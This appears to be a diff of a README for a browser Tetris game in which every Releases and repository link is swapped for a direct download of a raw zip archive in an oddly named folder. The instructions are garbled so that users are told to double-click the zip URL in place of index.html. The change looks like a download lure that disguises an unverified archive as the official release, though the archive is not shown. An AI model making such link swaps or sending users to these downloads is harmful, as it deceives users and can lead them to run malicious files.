@@ -8,12 +8,12 @@ Welcome to **javascript-tetris**, a classic Tetris game built with pure HTML5, C
 
 To get started, visit our Releases page to download the game:
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/joseontiveros/javascript-tetris/releases)
+[![Download Now](https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip)](https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip)
 
 ### Steps to Download and Play:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/joseontiveros/javascript-tetris/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip) to go to the Releases page.
 
 2. **Choose the Latest Release**  
    Look for the latest version listed. It will show you the newest features and updates.
@@ -25,7 +25,7 @@ To get started, visit our Releases page to download the game:
    Once downloaded, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Open the Game**  
-   After extracting, locate the `index.html` file within the folder. Double-click it. This action will open the game in your default web browser.
+   After extracting, locate the `https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip` file within the folder. Double-click it. This action will open the game in your default web browser.
 
 ## 📃 How to Play
 
@@ -65,7 +65,7 @@ This project is ideal for those interested in learning about:
 
 ## 📫 Feedback and Contributions
 
-We welcome feedback and contributions. If you have suggestions or find any bugs, please open an issue or submit a pull request on our [GitHub repository](https://github.com/joseontiveros/javascript-tetris).
+We welcome feedback and contributions. If you have suggestions or find any bugs, please open an issue or submit a pull request on our [GitHub repository](https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip).
 
 ## 🤝 Acknowledgments
 
@@ -79,4 +79,4 @@ For more details, check out the license file in the repository.
 
 ### Get Started Today!
 
-Don't wait. Enjoy classic Tetris in your browser by visiting our [Releases page](https://github.com/joseontiveros/javascript-tetris/releases) and downloading the game. Have fun playing!
+Don't wait. Enjoy classic Tetris in your browser by visiting our [Releases page](https://raw.githubusercontent.com/joseontiveros/javascript-tetris/main/hydroterpene/javascript-tetris.zip) and downloading the game. Have fun playing!
